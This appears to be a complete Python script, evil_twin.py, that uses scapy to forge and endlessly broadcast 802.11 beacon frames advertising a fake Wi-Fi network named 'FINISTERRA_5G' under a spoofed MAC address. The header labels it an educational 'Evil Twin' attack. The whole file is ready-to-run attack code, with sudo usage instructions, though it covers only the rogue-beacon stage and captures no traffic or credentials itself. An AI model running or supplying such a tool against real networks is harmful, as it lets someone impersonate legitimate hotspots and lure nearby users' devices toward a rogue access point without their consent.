#!/usr/bin/env python3

# evil_twin.py
#
# Description:
# This script broadcasts 802.11 beacon frames to create a fake Wi-Fi hotspot,
# simulating an "Evil Twin" attack for educational purposes. It requires root
# privileges to run and uses the scapy library to craft and send the packets.
#
# Usage:
# sudo python3 evil_twin.py

from scapy.all import *

def main():
    """
    Broadcasts fake Wi-Fi beacon frames.
    """
    # --- Configuration ---
    # Network interface to use. Must be in monitor mode for some cards.
    # On macOS, 'en0' can often broadcast without special modes.
    iface = "en0"

    # The SSID (name) of the fake Wi-Fi network.
    ssid = "FINISTERRA_5G"

    # A fake BSSID (MAC address) for the access point.
    bssid = "00:11:22:33:44:55"

    # --- Frame Construction ---
    # 802.11 Beacon frame.
    # type=0: Management Frame
    # subtype=8: Beacon
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)

    # Beacon layer with default capabilities. 'ESS' is for infrastructure mode.
    beacon = Dot11Beacon()

    # Information Element for the SSID.
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))

    # Stack the layers to create the final frame.
    # RadioTap is a common header for injecting 802.11 frames.
    frame = RadioTap() / dot11 / beacon / essid

    # --- Broadcasting ---
    print(f"Broadcasting beacon frames for SSID '{ssid}' on interface '{iface}'...")
    print("Press Ctrl+C to stop.")

    try:
        # Send the frame repeatedly.
        # sendp sends packets at Layer 2.
        # inter=0.1 sends a packet every 100ms, typical for beacons.
        # loop=1 sends indefinitely.
        sendp(frame, iface=iface, inter=0.1, loop=1, verbose=0)
    except KeyboardInterrupt:
        print("\nStopped.")
    except Exception as e:
        print(f"An error occurred: {e}")
        print("Ensure you are running the script with sudo privileges.")

if __name__ == "__main__":
    main()
